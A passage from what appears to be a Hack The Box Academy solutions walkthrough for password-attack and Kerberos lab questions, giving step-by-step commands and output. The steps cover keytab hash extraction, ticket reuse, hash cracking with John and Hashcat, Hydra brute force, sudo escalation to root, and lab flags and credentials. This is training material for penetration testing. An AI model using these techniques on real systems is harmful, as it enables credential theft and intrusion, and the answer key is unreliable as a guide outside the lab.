Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

carlos@inlanefreight.htb@linux01:~$ 
```

Students then can print the flag file "flag.txt" located at `/home/carlos@inlanefreight.htb/flag.txt`:

```
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/flag.txt

C@rl0s_1$_H3r3
```

Answer: `C@rl0s_1$_H3r3`

# Pass the Ticket (PtT) from Linux

## Question 5

### "Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstation's directory as a response."

Using the perviously established SSH session as `carlos`, students need to check `Carlo's` crontab:

Code: shell

```shell
crontab -l
```

```
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 

# m h  dom mon dow   command

*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

The crontab reveals the location of a `/.scripts` directory. Therefore, students need to navigate to it and view its contents:

Code: shell

```shell
cd /home/carlos@inlanefreight.htb/.scripts/
/.scripts$ ls -la
```

```
carlos@inlanefreight.htb@linux01:~$ cd /home/carlos@inlanefreight.htb/.scripts/
carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la

total 24
drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 31 15:05 .
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Oct 12 21:19 ..
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6 14:20 john.keytab
-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6 12:30 kerberos_script_test.sh
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Oct 31 15:05 svc_workstations._all.kt
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct 31 15:05 svc_workstations.kt
```

Subsequently, students need to extract hashes from `svc_workstations._all.kt`:

Code: shell

```shell
python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```

```
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677
```

Then, students need to use https://crackstation.net to decrypt the NTLM hash `7247e8d4387e76996ff3f18a34316fdd`:

![[HTB Solutions/CPTS/z. images/e8eb4520357a517ebea3c09cdb472f1a_MD5.jpg]]

The hash is revealed to be `Password4`, therefore, students can now connect with SSH to the spawned target machine using the credentials `svc_workstations@inlanefreight.htb`:

Code: shell

```shell
ssh svc_workstations@inlanefreight.htb@STMIP -p 2222
```

```
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-bmdznxzunh]─[~]
└──╼ [★]$ ssh svc_workstations@inlanefreight.htb@10.129.129.132 -p 2222
svc_workstations@inlanefreight.htb@10.129.129.132's password: 

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

svc_workstations@inlanefreight.htb@linux01:~$ 
```

At last, students can now read the flag file "flag.txt" located in the directory `/home/svc_workstations@inlanefreight.htb/`:

Code: shell

```shell
cat /home/svc_workstations@inlanefreight.htb/flag.txt
```

```
svc_workstations@inlanefreight.htb@linux01:~$ cat /home/svc_workstations@inlanefreight.htb/flag.txt 

Mor3_4cce$$_m0r3_Pr1v$
```

Answer: `Mor3_4cce$$_m0r3_Pr1v$`

# Pass the Ticket (PtT) from Linux

## Question 6

### "Check svc\_workstation's sudo privileges and get access as root. Submit the flag in /root/flag.txt directory as the response."

Using the previously established SSH session as `svc_workstations`, students need to check the sudo permissions of `svc_workstations`:

Code: shell

```shell
sudo -l
```

```
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l

[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

Students will see that they can run any binary as sudo, thus, they can easily escalate privileges to root:

Code: shell

```shell
sudo su
```

```
svc_workstations@inlanefreight.htb@linux01:~$ sudo su

root@linux01:/home/svc_workstations@inlanefreight.htb# 
```

At last, students need to read the flag file "flag.txt" located at `/root/`:

Code: shell

```shell
cat /root/flag.txt 
```

```
root@linux01:/home/svc_workstations@inlanefreight.htb# cat /root/flag.txt 

Ro0t_Pwn_K3yT4b
```

Answer: `Ro0t_Pwn_K3yT4b`

# Pass the Ticket (PtT) from Linux

## Question 7

### "Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the content of julio.txt from the domain share folder \\\\DC01\\julio."

Using the previously established and privileged SSH session, students need to look for all files in `/tmp` and identify the file that starts with `kerb5cc` whose owner is `julio@inlanefreight.htb`:

Code: shell

```shell
ls -la /tmp | grep krb5
```

```
root@linux01:~# ls -la /tmp | grep krb5

-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Oct 31 15:45 krb5cc_647401106_9JBodG
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct 31 15:45 krb5cc_647401106_HRJDux
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct 31 15:41 krb5cc_647401109_JKXJ8V
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Oct 31 15:45 krb5cc_647402606
```

Students need to copy the non expired ticket to the working directory and set the environment variable accordingly:

Code: shell

```shell
cp /tmp/krb5cc_647401106_9JBodG .
export KRB5CCNAME=/root/krb5cc_647401106_9JBodG
```

```
root@linux01:~# cp /tmp/krb5cc_647401106_9JBodG .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_9JBodG
```

Subsequently, students need to connect with SMB and read the flag on the shared folder:

Code: shell

```shell
smbclient //dc01/julio -k -c 'get julio.txt' -no-pass
cat julio.txt
```

```
root@linux01:~# smbclient //dc01/julio -k -c 'get julio.txt' -no-pass

getting file \julio.txt of size 17 as julio.txt (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)

root@linux01:~# cat julio.txt 

JuL1()_SH@re_fl@g
```

Answer: `JuL1()_SH@re_fl@g`

# Pass the Ticket (PtT) from Linux

## Question 8

### "Use the LINUX01$ Kerberos ticket to read the flag from \\\\DC01\\linux01. Submit the content as a response."

Using the previously established SSH session, students need to make a new directory for the final flag and then navigate to it:

Code: shell

```shell
mkdir final_flag
cd final_flag/
```

```
root@linux01:~# mkdir final_flag
root@linux01:~# cd final_flag/
```

Students then need to use the Kerberos ticket for the machine account located at `/etc/krb5.keytab`:

Code: shell

```shell
kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

```
root@linux01:~/final_flag# kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
```

At last, students need to access the shared folder `//dc01/linux01` to retrieve the flag `Us1nG_KeyTab_Like_@_PRO` from "flag.txt":

Code: shell

```shell
smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass
cat flag.txt
```

```
root@linux01:~/final_flag# smbclient //dc01/linux01 -k -c 'get flag.txt' -no-pass

getting file \flag.txt of size 52 as flag.txt (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)
root@linux01:~/final_flag# cat flag.txt

Us1nG_KeyTab_Like_@_PRO
```

Answer: `Us1nG_KeyTab_Like_@_PRO`

# Protected Files

## Question 1

### "Use the cracked password of the user Kira and log in to the host and crack the "id\_rsa" SSH key. Then, submit the password for the SSH key as the answer."

Students need to utilize `scp` with the credentials `kira:L0vey0u1!` that were previously attained to transfer the `id_rsa` file from the spawned target to Pwnbox/`PMVPN`:

Code: shell

```shell
scp kira@STMIP:~/.ssh/id_rsa .
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ scp kira@10.129.84.74:~/.ssh/id_rsa .

kira@10.129.84.74's password: 

id_rsa                                     100% 2546    32.4KB/s   00:00    
```

Thereafter, students need to download `ssh2john.py` on to Pwnbox/`PMVPN` from the [GitHub repo](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py):

Code: shell

```shell
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py

--2022-10-10 21:00:11--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9677 (9.5K) [text/plain]
Saving to: ‘ssh2john.py’

ssh2john.py                    100%[=================================================>]   9.45K  --.-KB/s    in 0s      

2022-10-10 21:00:12 (43.9 MB/s) - ‘ssh2john.py’ saved [9677/9677]
```

Subsequently, students need to extract the hash from `id_rsa` using `ssh2john.py` and then crack it with `John`, utilizing the wordlist `rockyou.txt`:

Code: shell

```shell
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ python ssh2john.py id_rsa > id_rsa.hash
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
L0veme           (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:05 DONE (2022-10-10 21:04) 0.1689g/s 2422Kp/s 2422Kc/s 2422KC/sa6_123..*7¡Vamos!
Session completed
```

Once cracked, students will find that the password of the `SSH` key is `L0veme`.

Answer: `L0veme`

# Protected Archives

## Question 1

### "Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer."

Students need to utilize `scp` with the credentials `kira:L0vey0u1!` that were previously attained to transfer the `Notes.zip` file from the spawned target to Pwnbox/`PMVPN`:

Code: shell

```shell
scp kira@STMIP:~/Documents/Notes.zip .
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ scp kira@10.129.101.20:~/Documents/Notes.zip .

The authenticity of host '10.129.101.20 (10.129.101.20)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.101.20' (ECDSA) to the list of known hosts.
kira@10.129.101.20's password:

Notes.zip        100%  222     2.9KB/s   00:00 
```

Subsequently, students need to extract the hash from the zip file using `zip2john`:

Code: shell

```shell
zip2john Notes.zip > notes.hash
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~]
└──╼ [★]$ zip2john Notes.zip > notes.hash

ver 1.0 efh 5455 efh 7875 Notes.zip/notes.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=D0CED23B
```

Then, students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Subsequently, students need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

At last, students need to crack the she hash with `john`, utilizing `mut_password.list` as the wordlist:

Code: shell

```shell
john notes.hash --wordlist=mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ john notes.hash --wordlist=mut_password.list

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd3!       (Notes.zip/notes.txt)
1g 0:00:00:00 DONE (2022-10-10 21:27) 50.00g/s 3686Kp/s 3686Kc/s 3686KC/s P00hbear2022..R0ckst@r93
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password for the ZIP file is revealed to be `P@ssw0rd3!`, therefore, students can now unzip the file and read the contents of `notes.txt`:

Code: shell

```shell
unzip Notes.zip
cat notes.txt
```

```
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ unzip Notes.zip 

Archive:  Notes.zip
[Notes.zip] notes.txt password: 
 extracting: notes.txt         
┌─[us-academy-1]─[10.10.14.249]─[htb-ac330204@htb-wrkdmqmjgb]─[~/Password-Attacks]
└──╼ [★]$ cat notes.txt

HTB{ocnc7r4io8ucsj8eujcm}
```

Answer: `HTB{ocnc7r4io8ucsj8eujcm}`

# Password Attacks Lab - Easy

## Question 1

### "Examine the first target and submit the root password as the answer."

Students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

First, students need to do a bruteforce attack with `Hydra` (its important to add the `-f` flag to make `Hydra` stop at the first valid credentials) for initial access against the FTP service, utilizing `username.list` and `password.list` (setting the threads to a high number might cause the bruteforce attack to fail):

Code: shell

```shell
hydra -L Password-Attacks/username.list -P Password-Attacks/password.list ftp://STMIP -t 40 -f -u
```

```
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-ihbuammlec]─[~]
└──╼ [★]$ hydra -L Password-Attacks/username.list -P Password-Attacks/password.list ftp://10.129.50.229 -t 40 -f -u

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-20 02:24:17
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 21112 login tries (l:104/p:203), ~528 tries per task
[DATA] attacking ftp://10.129.50.229:21/
[STATUS] 724.00 tries/min, 724 tries in 00:01h, 20388 to do in 00:29h, 40 active
<SNIP>
[21][ftp] host: 10.129.50.229   login: mike   password: 7777777
<SNIP>
```

From the output of `Hydra`, students will know that the credentials `mike:7777777` are valid, therefore, they need to utilize them to connect to the FTP service on the spawned target:

Code: shell

```shell
ftp STMIP
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ ftp 10.129.202.219

Connected to 10.129.202.219.
220 (vsFTPd 3.0.3)
Name (10.129.202.219:root): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Subsequently, students need to enumerate the file share to discover the file `id_rsa`:

Code: shell

```shell
ls -la
```

```
ftp> ls -la

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 Feb 09  2022 .
drwx------    2 1000     1000         4096 Feb 09  2022 ..
-rw-rw-r--    1 1000     1000          554 Feb 09  2022 authorized_keys
-rw-------    1 1000     1000         2546 Feb 09  2022 id_rsa
-rw-r--r--    1 1000     1000          570 Feb 09  2022 id_rsa.pub
226 Directory send OK.
ftp> 
```

Then, students need to download/`get` the file `id_rsa` then exit:

Code: shell

```shell
get id_rsa
exit
```

```
ftp> get id_rsa

local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (2546 bytes).
226 Transfer complete.
2546 bytes received in 0.00 secs (4.3436 MB/s)
ftp> exit

221 Goodbye.
```

Students need to set the permissions 600 on `id_rsa` and then SSH as `mike` (using `7777777` as the passphrase):

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ chmod 600 id_rsa 
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ ssh -i id_rsa mike@10.129.202.219

The authenticity of host '10.129.202.219 (10.129.202.219)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.219' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

mike@skills-easy:~$ 
```

At last, students will find the root password `dgb6fzm0ynk@AME9pqu` inside the file `.bash_history`:

Code: shell

```shell
grep root .bash_history
```

```
mike@skills-easy:~$ grep root .bash_history 

analysis.py -u root -p dgb6fzm0ynk@AME9pqu
```

Answer: `dgb6fzm0ynk@AME9pqu`

# Password Attacks Lab - Medium

## Question 1

### "Examine the second target and submit the contents of flag.txt in /root/ as the answer."

First, students need to map the available SMB shares on the target using `smbmap`:

Code: shell

```shell
smbmap -H STMIP
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ smbmap -H 10.129.202.221

[+] IP: 10.129.202.221:445	Name: 10.129.202.221                                    
  Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	SHAREDRIVE                                        	READ ONLY	SHARE-DRIVE
	IPC$                                              	NO ACCESS	IPC Service (skills-medium server (Samba, Ubuntu))
```

Subsequently, students need to connect to `SHAREDRIVE` and retrieve the file `Docs.zip`:

Code: shell

```shell
smbclient -N '\\STMIP\SHAREDRIVE\'
get Docs.zip
exit
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ smbclient -N '\\10.129.202.221\SHAREDRIVE\'

Try "help" to get a list of possible commands.
smb: \> get Docs.zip

getting file \Docs.zip of size 6724 as Docs.zip (152.7 KiloBytes/sec) (average 152.7 KiloBytes/sec)

smb: \> exit
```

When attempting to unzip the file, students will discover the archive is password protected:

Code: shell

```shell
unzip Docs.zip
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ unzip Docs.zip

Archive:  Docs.zip
[Docs.zip] Documentation.docx password: 
```

Therefore, students need to utilize `zip2john` to extract the hash:

Code: shell

```shell
zip2john Docs.zip > zip.hash
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ zip2john Docs.zip > zip.hash

Created directory: /home/htb-ac330204/.john
ver 2.0 efh 5455 efh 7875 Docs.zip/Documentation.docx PKZIP Encr: 2b chk, TS_chk, cmplen=6522, decmplen=9216, crc=B1855553
```

Students need to download [Password-Attacks.zip](https://academy.hackthebox.com/storage/resources/Password-Attacks.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip && unzip Password-Attacks.zip

--2022-11-22 12:14:07--  https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6268 (6.1K) [application/zip]
Saving to: ‘Password-Attacks.zip’

Password-Attacks.zip                    100%[=============================================================================>]   6.12K  --.-KB/s    in 0s      

2022-11-22 12:14:07 (35.0 MB/s) - ‘Password-Attacks.zip’ saved [6268/6268]

Archive:  Password-Attacks.zip
   creating: Password-Attacks/
  inflating: __MACOSX/._Password-Attacks  
  inflating: Password-Attacks/password.list  
  inflating: __MACOSX/Password-Attacks/._password.list  
  inflating: Password-Attacks/custom.rule  
  inflating: __MACOSX/Password-Attacks/._custom.rule  
  inflating: Password-Attacks/username.list  
  inflating: __MACOSX/Password-Attacks/._username.list
```

Subsequently, students need to create a mutated wordlist with `Hashcat`, utilizing the passwords file `password.list` and `custom.rule` for the mutations rules file:

Code: shell

```shell
hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

```
┌─[us-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tgnd7xlrrl]─[~]
└──╼ [★]$ hashcat Password-Attacks/password.list -r Password-Attacks/custom.rule --stdout | sort -u > mut_password.list
```

Students need to crack the password using `John` and the wordlist `mut_password.list`:

Code: shell

```shell
john zip.hash --wordlist=mut_password.list
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ john zip.hash --wordlist=mut_password.list

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Destiny2022!     (Docs.zip/Documentation.docx)
1g 0:00:00:00 DONE (2022-11-07 19:46) 33.33g/s 1092Kp/s 1092Kc/s 1092KC/s cristina!..F00tb@ll81
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

From the output, students will know that the password of the archive is `Destiny2022!`, therefore, they now can unzip it successfully:

Code: shell

```shell
unzip Docs.zip
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ unzip Docs.zip

Archive:  Docs.zip
[Docs.zip] Documentation.docx password: 
  inflating: Documentation.docx 
```

Subsequently, students need to open `LibreOffice Writer` and to view the `Documentation.docx` file:

![[HTB Solutions/CPTS/z. images/9ef3d863c144a962a0d6c20c6b1a425b_MD5.jpg]]

Students need to click on on `File` -> `Open`:

![[HTB Solutions/CPTS/z. images/3baff4b2518162439a59d53556155097_MD5.jpg]]

Then, students need to select `Documentation.docx` and click `Open`:

![[HTB Solutions/CPTS/z. images/20da80bcfd832e29bb990cd297cb6b44_MD5.jpg]]

However, students will find that it is also password protected:

![[HTB Solutions/CPTS/z. images/81a7a7737dd7985b443a3567623a2b05_MD5.jpg]]

Therefore, students need to use `office2john` to extract the password's hash:

Code: shell

```shell
python3 /usr/share/john/office2john.py Documentation.docx > docx.hash
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ python3 /usr/share/john/office2john.py Documentation.docx > docx.hash
```

Then, students need to crack the hash with `john` and the wordlist `mut_password.list`, finding the password to be `987654321`:

Code: shell

```shell
john docx.hash --wordlist=mut_password.list
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ john docx.hash --wordlist=mut_password.list

Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
987654321        (Documentation.docx)
1g 0:00:00:02 DONE (2022-11-07 19:47) 0.4385g/s 1571p/s 1571c/s 1571C/s 9876542017!..98765432109
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Students can now access the document back in `LibreOffice Writer`, where the credentials `jason:C4mNKjAtL2dydsYa6` are exposed:

![[HTB Solutions/CPTS/z. images/370c0bb9bd5a629cf3d99a937627cb53_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/62bb716a0f789b86ebf00c99fa6983bc_MD5.jpg]]

Then, students need to connect to the spawned target over SSH with the found credentials `jason:C4mNKjAtL2dydsYa6`:

Code: shell

```shell
ssh jason@STMIP
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-mlbuatkyxv]─[~]
└──╼ [★]$ ssh jason@10.129.202.221

The authenticity of host '10.129.202.221 (10.129.202.221)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.202.221' (ECDSA) to the list of known hosts.
jason@10.129.202.221's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

jason@skills-medium:~$ 
```

Subsequently, students need to connect to the local mysql database, reusing the credentials `jason:C4mNKjAtL2dydsYa6`:

Code: shell

```shell
mysql -u jason -pC4mNKjAtL2dydsYa6
```

```
jason@skills-medium:~$ mysql -u jason -pC4mNKjAtL2dydsYa6

mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

